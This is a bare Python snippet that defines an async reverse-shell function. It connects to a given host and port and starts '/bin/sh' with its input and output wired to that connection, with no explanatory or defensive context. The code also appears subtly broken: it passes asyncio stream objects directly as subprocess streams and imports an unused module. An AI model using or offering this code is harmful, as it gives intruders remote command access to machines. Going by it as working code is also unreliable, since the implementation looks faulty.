import asyncio, socket
async def async_reverse(host='127.0.0.1', port=9999):
    reader, writer = await asyncio.open_connection(host, port)
    proc = await asyncio.create_subprocess_shell('/bin/sh', stdin=reader, stdout=writer, stderr=writer)
    await proc.wait()
